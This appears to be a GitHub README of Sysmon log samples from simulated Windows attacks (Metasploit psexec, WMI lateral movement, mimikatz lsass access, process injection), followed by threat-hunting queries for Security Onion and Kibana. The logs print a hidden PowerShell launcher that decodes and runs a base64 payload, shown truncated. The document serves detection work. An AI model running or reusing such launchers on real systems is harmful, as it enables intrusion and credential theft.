# SysmonEvents
## SYSMON EVENTS USING THIS GITHUB CONFIG
https://github.com/ion-storm/sysmon-config

##### Lateral movement using psexec technique from MSF
Registry value set:
RuleName: MitreRef=T1060,Technique=Registry Autorun Keys,Tactic=Persistence
EventType: SetValue
UtcTime: 2021-06-12 03:49:29.470
ProcessGuid: {298db6a9-2c67-60c4-eeb3-000000000000}
ProcessId: 620
Image: C:\Windows\system32\services.exe
TargetObject: HKLM\System\CurrentControlSet\Services\DpRHdvsE\Start
Details: DWORD (0x00000003)

###### Second registry event
Registry value set:
RuleName: MitreRef=T1060,Technique=Registry Autorun Keys,Tactic=Persistence
EventType: SetValue
UtcTime: 2021-06-12 03:49:29.470
ProcessGuid: {298db6a9-2c67-60c4-eeb3-000000000000}
ProcessId: 620
Image: C:\Windows\system32\services.exe
TargetObject: HKLM\System\CurrentControlSet\Services\DpRHdvsE\ImagePath
Details: %%COMSPEC%% /b /c start /b /min powershell.exe -nop -w hidden -noni -c "if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAMguxGACA7shortentedforreadability''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);"

###### Process create
Process Create:
RuleName: -
UtcTime: 2021-06-12 03:49:29.500
ProcessGuid: {298db6a9-2ec9-60c4-b0dc-320000000000}
ProcessId: 2984
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.19041.546 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: C:\Windows\system32\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden -noni -c "if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAMguxshortentedforreadability''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);"
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {298db6a9-2c68-60c4-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=321A50053155122E6ACE9691197A8E3F,SHA256=100348552B388AB5D0095BB09EBF0EBC22668092FB8E0F92AC7ED5909492B4F6,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: {298db6a9-2c67-60c4-eeb3-000000000000}
ParentProcessId: 620
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe

##### PROCESS CREATE
Process Create:
RuleName: technique_id=T1086,technique_name=PowerShell
UtcTime: 2018-09-01 02:26:12.384
ProcessGuid: {79579f2b-f8c4-5b89-0000-0010a8e24300}
ProcessId: 5568
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.14393.0 (rs1_release.160715-1616)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
CommandLine: powershell.exe  -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkAT
CurrentDirectory: C:\Windows\system32\
User: computer\user
LogonGuid: {79579f2b-f60c-5b89-0000-0020415e0600}
LogonId: 0x65E41
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=044A0CF1F6BC478A7172BF207EEF1E201A18BA02,MD5=097CE5761C89434367598B34FE32893B,SHA256=BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453
ParentProcessGuid: {79579f2b-f737-5b89-0000-0010a2d22200}
ParentProcessId: 2764
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: "C:\Windows\system32\cmd.exe"

##### PROCESS CREATE LATERAL MOVEMENT USING WMI
Process Create:
RuleName: -
UtcTime: 2021-06-24 02:44:23.786
ProcessGuid: {f3da3d38-f187-60d3-b099-6a1600000000}
ProcessId: 7072
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.14393.206 (rs1_release.160915-0644)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvA==
CurrentDirectory: C:\WINDOWS\system32\
User: computer\user
LogonGuid: {f3da3d38-f187-60d3-e798-6a1600000000}
LogonId: 0x166A98E7
TerminalSessionId: 0
IntegrityLevel: High
Hashes: MD5=097CE5761C89434367598B34FE32893B,SHA256=BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453
ParentProcessGuid: {f3da3d38-d166-60cb-4b31-020000000000}
ParentProcessId: 2868
ParentImage: C:\Windows\System32\wbem\WmiPrvSE.exe
ParentCommandLine: C:\WINDOWS\system32\wbem\wmiprvse.exe -secured -Embedding


##### NETWORK CALLBACK
This config does not catch network connections when injected into other processes.
Network connection detected:
RuleName: technique_id=T1218,technique_name=Signed Binary Proxy Execution
UtcTime: 2018-09-01 02:26:19.331
ProcessGuid: {79579f2b-f8c7-5b89-0000-0010f4864400}
ProcessId: 5552
Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
User: computer\user
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 192.168.1.130
SourceHostname: computer
SourcePort: 1907
SourcePortName: 
DestinationIsIpv6: false
DestinationIp: 192.168.1.143
DestinationHostname: 
DestinationPort: 443
DestinationPortName: https

##### CREDENTIAL DUMPING
##### This is mimikatz grabbing credentials from current logged on users
Process accessed:
RuleName: technique_id=T1003,technique_name=Credential Dumping
UtcTime: 2018-09-01 02:40:12.833
SourceProcessGUID: {79579f2b-fc0c-5b89-0000-001097eb6f00}
SourceProcessId: 5212
SourceThreadId: 6996
SourceImage: C:\Windows\System32\rundll32.exe
TargetProcessGUID: {79579f2b-f5fa-5b89-0000-00105a9c0000}
TargetProcessId: 604
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1010
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+a6574|C:\Windows\System32\KERNELBASE.dll+20edd|UNKNOWN(000001C7A2AA710D)

##### This is mimikatz grabbing hashes from the local accounts
Process accessed:
RuleName: technique_id=T1003,technique_name=Credential Dumping
UtcTime: 2018-09-01 02:45:26.030
SourceProcessGUID: {79579f2b-fd45-5b89-0000-0010c5657300}
SourceProcessId: 6420
SourceThreadId: 4172
SourceImage: C:\Windows\System32\rundll32.exe
TargetProcessGUID: {79579f2b-f5fa-5b89-0000-00105a9c0000}
TargetProcessId: 604
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1FFFFF
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+a6574|C:\Windows\System32\KERNELBASE.dll+20edd|UNKNOWN(0000022B28BB1D25)

##### PROCESS INJECTION
Registry object added or deleted:
CreateRemoteThread detected:
RuleName: -
UtcTime: 2021-06-24 03:10:58.927
SourceProcessGuid: {f3da3d38-f187-60d3-b099-6a1600000000}
SourceProcessId: 7072
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetProcessGuid: {f3da3d38-d163-60cb-f2d1-010000000000}
TargetProcessId: 1316
TargetImage: C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
NewThreadId: 4032
StartAddress: 0x000001A4BC400000
StartModule: -
StartFunction: -


### SOQueries Hunt
##### Filter for all sysmon events
* AND event.module:"sysmon" | groupby event.module event.dataset

##### Filter for service creations events



##### Filter for all process injection type events
* AND event.module: "sysmon" AND event.dataset:"create_remote_thread" | groupby event.module event.dataset

##### Filter for network events
* AND event.module: "sysmon" AND event.dataset: "network_connection" | groupby event.module event.dataset
Manually exclude known good events

##### Filtering for specifc systems
* AND event.module: "sysmon" AND agent.ip:"x.x.x.x" | groupby event.module event.dataset


### SOQueries Kibana Discovery
##### Credential dumps
Note: You are looking for processes that do not normally touch lsass.exe
event.module: "sysmon" AND event.dataset:"create_remote_thread" AND message:"*lsass.exe"

event.module: "sysmon" AND event.dataset:"create_remote_thread" AND winlog.event_data.targetImage:"*lsass.exe"

##### Lateral movement
event.module: "sysmon" AND event.dataset:"registry_value_set" AND winlog.event_data.targetObject:"*Start"

event.module: "sysmon" AND process.parent.executable:"WmiPrvSE.exe"


##### Process injection
Note: add following fields on the left: winlog.event_data.sourceImage and winlog.event_data.targetImage and look for sourceimages like powershell|rundll32

event.module: "sysmon" AND event.dataset:"create_remote_thread"

(event.module:"sysmon" AND event.dataset:"create_remote_thread" AND winlog.event_data.sourceImage:"powershell.exe") OR (event.module:"sysmon" AND event.dataset:"create_remote_thread" AND winlog.event_data.sourceImage:"rundll32.exe" )

##### Network SMB executable file transfer
rule.name: "ET POLICY SMB Executable File Transfer"

##### Remote Service Control Request
rule.name: "ET RPC DCERPC SVCCTL - Remote Service Control Manager Access"

dce_rpc.operation.keyword: OpenSCManagerA

##### Lateral movement using NTLM (pass-the-hash)
event.dataset.keyword: ntlm

##### Lateral movement using WinRM
rule.name: "ET POLICY WinRM wsman Access - Possible Lateral Movement"

rule.metadata.tag.keyword: WinRM

##### CobaltStrike C2 communication (not sure how accurate this is, but it returned only C2 communication)
server.packets >8 AND server.packets <12







